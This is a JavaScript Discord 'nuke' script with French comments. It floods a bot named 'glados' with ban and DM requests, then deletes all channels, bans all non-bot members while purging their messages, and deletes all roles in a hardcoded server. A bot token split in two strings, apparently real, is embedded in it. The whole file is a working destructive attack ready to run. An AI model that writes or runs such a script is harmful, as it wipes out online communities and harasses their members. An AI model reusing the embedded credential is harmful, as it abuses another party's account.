const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;
const guild = "1534554643583995936";
const gladosId = "1098179232779223080";

async function destroy() {
  console.log("--- 1. DEBUT DU SPAM SUR GLADOS ---");

  // On lance 200 requêtes de ban et de création de DM en boucle pour saturer glados
  let spamPromises = [];
  for (let i = 0; i < 200; i++) {
    // tentative de ban sur glados
    spamPromises.push(fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${gladosId}`, {
      method: "PUT",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ delete_message_seconds: 0 })
    }).catch(() => {}));
    
    // spam de DM sur glados
    spamPromises.push(fetch(`https://discord.com/api/v9/users/@me/channels`, {
      method: "POST",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ recipient_id: gladosId })
    }).catch(() => {}));
  }
  await Promise.all(spamPromises);
  console.log("--- SPAM SUR GLADOS TERMINE ---");

  console.log("--- 2. DEBUT DU NUKE ---");

  // supprimer tous les salons en boucle
  console.log("--- SUPPRESSION DES SALONS ---");
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!channels.message) {
    for (let c of channels) {
      await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      console.log(`salon supprimé : ${c.name}`);
      await new Promise(r => setTimeout(r, 100));
    }
  }

  // ban tout le monde
  console.log("--- BAN DES MEMBRES ---");
  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!members.message) {
    let banPromises = members.map(m => {
      if (m.user.bot) return Promise.resolve();
      return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
        method: "PUT",
        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
        body: JSON.stringify({ delete_message_seconds: 604800 })
      }).catch(() => {});
    });
    await Promise.all(banPromises);
    console.log("membres bannis.");
  }

  // supprimer les rôles
  console.log("--- SUPPRESSION DES RÔLES ---");
  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!roles.message) {
    for (let r of roles) {
      if (r.name === "@everyone" || r.managed) continue;
      await fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      console.log(`rôle supprimé : ${r.name}`);
      await new Promise(r => setTimeout(r, 100));
    }
  }

  console.log("--- FIN DE L'OPERATION ---");
}

destroy();